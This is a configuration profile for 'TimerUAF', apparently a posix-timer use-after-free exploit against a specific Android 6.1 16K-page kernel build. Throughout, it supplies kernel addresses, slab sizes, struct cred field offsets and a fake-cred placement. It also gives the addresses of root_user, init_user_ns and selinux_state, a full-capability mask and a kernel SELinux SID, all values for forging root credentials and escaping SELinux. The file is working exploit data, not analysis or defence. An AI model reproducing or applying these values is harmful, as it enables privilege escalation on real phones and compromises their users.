# TimerUAF kernel profile (HOCON; JSON remains valid)
# Kernel: 6.1.172-android14-11-g8d0115b07367-ab16385437 (Android 16 QPR,
#   November 2026 monthly, build CP4A.261105.040.A1) — 16K-page kernel_16k
#   variant, shipped inside the same factory images as the 4K kernel on the
#   16K-capable devices (bluejay, panther, cheetah, lynx, shiba, husky,
#   akita, tokay, caiman, komodo, tegu, comet, felix).
#
# The release string is identical to the 4K profile; the app additionally
# matches page_size so the two profiles cannot be confused.  Derived from
# the tegu factory image's kernel_16k (LZ4 legacy -> raw arm64 Image
# 36,620,800 bytes, sha256 of the decompressed image recorded in
# work/xi/tegu172-boot/):
#   kernel_16k sha256 184a9ba1dd675a46fc95506c040777dfa72287109e3392cd10bf7292c8b2b20e
#
# begin_new_exec call order (verified by disassembly at 0xffffc000083a7470):
#   ... -> exec_mmap -> posix_cpu_timers_exit -> exit_itimers  => VULNERABLE
release = "6.1.172-android14-11-g8d0115b07367-ab16385437"
schema_version = 1
ksu_kmi = "android14-6.1"

# Select this profile only on a 16K userspace.
page_size = 16384
page_shift = 14
slab_order = 0
slab_size = 16384
linear_min = 0xffff000000000000
linear_max = 0xffffc00000000000

# The 16K slab is order-0, so the reclaim is gated on a page_alloc event
# instead of the PCP/slabinfo path used by the 4K profile.
pcp_free = 0

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) call site.
#   do_timer_create@0xffffc00008193000, bl kmem_cache_alloc@0xffffc000081930a4
#   x0 = [0xffffc0000a32e0a0] = posix_timers_cache  (size 0x108, flags
#   0x4040000 = SLAB_PANIC|SLAB_ACCOUNT, no SLAB_HWCACHE_ALIGN)
timer_site = 0xffffc000081930a8
timer_alloc = 0x108

# cred_jar: sizeof(struct cred)=0xb0, slab object=0xc0 (same 6.1 layout).
cred_req = 0xb0
cred_alloc = 0xc0
cred_size = 0xb0
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
cred_ucounts_off = 0x90
cred_group_off = 0x98
# Distance from the stale k_itimer rb_node to the fake cred base.
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffc0000a366858
panic_on_warn = 0xffffc0000a0f0c0c

# task_struct / cred layout (BTF): identical to the 4K build.
#   sizeof(task_struct) = 0x12c0, task_struct.cred = 0x838
#   (real_cred at 0x830), allocated in dup_task_struct:
#     bl kmem_cache_alloc_node@0xffffc000080ab988,
#     x0 = [0xffffc0000a305a10] = task_struct_cachep
task_cred_off = 0x838
copy_process_low21 = 0xab98c
task_alloc_bytes = 0x12c0

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffc0000a1195c0
init_user_ns = 0xffffc0000a119330
init_ucounts = 0xffffc0000a11ae48
init_groups = 0xffffc0000a11a8e0

# task_security_struct.  The exploit fills 32 bytes from this offset, so 0
# sets every SID field.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
